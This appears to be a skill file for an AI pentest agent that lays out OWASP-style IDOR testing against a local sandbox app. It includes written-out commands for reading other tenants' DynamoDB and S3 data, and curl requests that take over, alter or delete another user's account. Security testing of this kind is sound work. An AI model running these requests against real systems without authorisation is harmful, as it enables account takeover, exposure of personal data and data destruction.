---
name: idor-testing
description: IDOR (Insecure Direct Object Reference) testing per OWASP WSTG-ATHZ-04.
---
# IDOR Testing — OWASP WSTG-ATHZ-04

You are testing for Insecure Direct Object References where one
principal can access another's resources by manipulating identifiers.

## GROUNDING RULES (MANDATORY)

1. Every finding MUST include the exact command and actual output
2. If you didn't run it, you don't have a finding — NEVER fabricate
3. Show BEFORE (seed data) and AFTER (cross-user access) clearly
4. Include the HTTP status or CLI exit code as evidence
5. Classify each finding: Horizontal IDOR, Vertical IDOR, or Mass Assignment

## PHASE 1: PLAN (use think tool)

```
think(
  thought="Map all object references in this app. What IDs are
  user-controlled? Partition keys, path params, query params,
  request body fields. Which lack server-side authz checks?",
  cycle_count=3,
  system_prompt="You are an IDOR specialist following WSTG-ATHZ-04."
)
```

## PHASE 2: MAP OBJECT REFERENCES

Identify every user-controllable identifier:
- DynamoDB partition/sort keys (VendorID, AddressID, OrderID)
- API Gateway path parameters (/users/{id}/addresses)
- Query string parameters (?vendor_id=X)
- Request body fields (JSON payloads with tenant IDs)
- S3 object keys (s3://bucket/{tenant}/{file})

Store the map in graph:
```
graph_add_entity(entity_type='IDORSurface', properties={
  "run_id": "{{run_id}}", "app": "{{target_app}}",
  "references": ["VendorID", "AddressID", ...],
  "endpoints": ["/addresses", "/orders", ...],
  "stores": ["SupplierTable", "AddressBucket", ...]
})
```

## PHASE 3: SEED TEST DATA (two tenants)

Create data as two distinct principals:
```
# Tenant A — the victim
sandbox_execute: aws dynamodb put-item --table-name <table> \
  --item '{"VendorID":{"S":"vendor-A"},"AddressID":{"S":"addr-001"},
  "Street":{"S":"123 Secret St"},"SSN":{"S":"111-22-3333"}}'

# Tenant B — the attacker
sandbox_execute: aws dynamodb put-item --table-name <table> \
  --item '{"VendorID":{"S":"vendor-B"},"AddressID":{"S":"addr-002"},
  "Street":{"S":"456 Other St"}}'
```

## PHASE 4: HORIZONTAL IDOR TESTS

### 4a. Direct Object Reference
As tenant-B, request tenant-A's specific record:
```
sandbox_execute: aws dynamodb get-item --table-name <table> \
  --key '{"VendorID":{"S":"vendor-A"},"AddressID":{"S":"addr-001"}}'
```
If this returns vendor-A's data (SSN) → PROVEN Horizontal IDOR.

### 4b. Enumeration / Mass Retrieval
Scan without tenant filter:
```
sandbox_execute: aws dynamodb scan --table-name <table> --max-items 50
```
If results contain multiple tenants → PROVEN missing tenant isolation.

### 4c. Sequential ID Guessing
Try predictable IDs: addr-001, addr-002, addr-003...
```
for id in addr-001 addr-002 addr-003; do
  sandbox_execute: aws dynamodb get-item --table-name <table> \
    --key '{"VendorID":{"S":"vendor-A"},"AddressID":{"S":"'$id'"}}'
done
```

### 4d. API Parameter Tampering
If API Gateway exists, tamper with path/query params:
```
http_request(url='http://localhost:4566/restapis/<id>/prod/_user_request_/addresses?vendor_id=vendor-A',
  method='GET')
```

## PHASE 5: VERTICAL IDOR TESTS

Test if low-privilege role can access admin resources:
```
# Assume a limited role
sandbox_execute: aws sts assume-role \
  --role-arn arn:aws:iam::000000000000:role/ReadOnlyRole \
  --role-session-name idor-test

# Try admin-only operations with those creds
sandbox_execute: aws dynamodb scan --table-name <admin-table>
sandbox_execute: aws s3 ls s3://<admin-bucket>/
```

## PHASE 6: S3 OBJECT-LEVEL IDOR

```
# List tenant-A's prefix as tenant-B
sandbox_execute: aws s3 ls s3://<bucket>/vendor-A/ --recursive

# Read tenant-A's objects
sandbox_execute: aws s3 cp s3://<bucket>/vendor-A/sensitive.json -
```

## PHASE 7: STORE PROVEN FINDINGS

For each confirmed IDOR:
```
graph_add_entity(
  entity_type='ProvenExploit',
  properties={
    "run_id": "{{run_id}}",
    "app": "{{target_app}}",
    "vuln_class": "IDOR",
    "idor_subtype": "horizontal|vertical|enumeration",
    "cwe": "CWE-639",
    "owasp": "WSTG-ATHZ-04",
    "severity": "CRITICAL",
    "resource": "<table or bucket name>",
    "command_run": "<exact command>",
    "actual_output": "<actual output proving access>",
    "impact": "Cross-tenant PII exposure (SSN, addresses)",
    "steps_to_reproduce": ["seed as A", "query as B", "observe A's data"]
  }
)
```

Then ALWAYS classify the finding via the security brick:
```
security_classify_finding(
  finding_id='<entity_id from above>',
  cwe_id='CWE-639'
)
```
This creates a CLASSIFIED_AS edge in the graph linking your
finding to the CWE taxonomy. The consolidator uses this.
```

ALL of these properties are REQUIRED. Do not omit cwe, severity,
or idor_subtype — the consolidator agent will discard findings
missing these fields.

## PHASE 8: STORE LEARNINGS IN MEMORY

Store what you learned as long-term memory:
```
memory_store(
  content='<what you learned about IDOR in this app>',
  
  memory_type='long_term',
  category='fact'
)
```
MUST use memory_type='long_term' and category='fact' so learnings
persist across sessions. short_term memories expire.

## PHASE 9: KB SEARCH (before ingest)

Before ingesting new findings, search KB for prior knowledge:```
search(query='IDOR ExampleAddressService', limit=5)
```
This retrieves prior proven findings from the knowledge base.
Use this to avoid duplicate work and build on prior results.

Then ingest new findings:
```
ingest(
  content='<summary of proven IDOR findings with evidence>',
  source='pentest',
  document_id='kb-idor-<run_id>',
  extract_entities=true
)
```

## CWE CLASSIFICATION

CWE-639: Authorization Bypass Through User-Controlled Key
CWE-284: Improper Access Control | CWE-862: Missing Authorization
CWE-915: Mass Assignment (extra fields in POST/PUT body)

## HTTP API IDOR TESTING (REST APIs)

When the target is a REST API (not raw DynamoDB), use curl:

### Step 1: Discover API
```
sandbox_execute(env_id, 'curl -s {{target_url}}')
sandbox_execute(env_id, 'curl -s {{target_url}}/openapi.json')
sandbox_execute(env_id, 'curl -s {{target_url}}/swagger.json')
```

### Step 2: Register 2 users and get tokens
```
sandbox_execute(env_id, 'curl -s -X POST {{target_url}}/users/v1/register -H "Content-Type: application/json" -d \'{"username":"attacker","password":"pass123","email":"attacker@test.com"}\'')
sandbox_execute(env_id, 'curl -s -X POST {{target_url}}/users/v1/login -H "Content-Type: application/json" -d \'{"username":"attacker","password":"pass123"}\'')
```
Save the auth token from the login response.

### Step 3: Test EVERY endpoint with EVERY method
For each endpoint, try as the attacker accessing the victim's resources:
```
# GET — read another user's data
sandbox_execute(env_id, 'curl -s -H "Authorization: Bearer <attacker_token>" {{target_url}}/users/v1/<victim_username>')

# PUT — modify another user's email
sandbox_execute(env_id, 'curl -s -X PUT -H "Authorization: Bearer <attacker_token>" -H "Content-Type: application/json" -d \'{"email":"pwned@evil.com"}\' {{target_url}}/users/v1/<victim>/email')

# PUT — change another user's password (account takeover)
sandbox_execute(env_id, 'curl -s -X PUT -H "Authorization: Bearer <attacker_token>" -H "Content-Type: application/json" -d \'{"password":"hacked"}\' {{target_url}}/users/v1/<victim>/password')

# DELETE — delete another user's account
sandbox_execute(env_id, 'curl -s -X DELETE -H "Authorization: Bearer <attacker_token>" {{target_url}}/users/v1/<victim>')
```

### Step 4: Test mass assignment
```
# Register with admin=true
sandbox_execute(env_id, 'curl -s -X POST {{target_url}}/users/v1/register -H "Content-Type: application/json" -d \'{"username":"evil","password":"evil","email":"evil@test.com","admin":true}\'')
# Check if admin was set
sandbox_execute(env_id, 'curl -s {{target_url}}/users/v1/evil')
```

### Step 5: Test debug/hidden endpoints
```
sandbox_execute(env_id, 'curl -s {{target_url}}/users/v1/_debug')
```

## AWS CLI PREFIX (all sandbox commands)
```
AWS_DEFAULT_REGION=us-east-1 AWS_ACCESS_KEY_ID=test \
AWS_SECRET_ACCESS_KEY=test aws --endpoint-url=http://localhost:4566
```
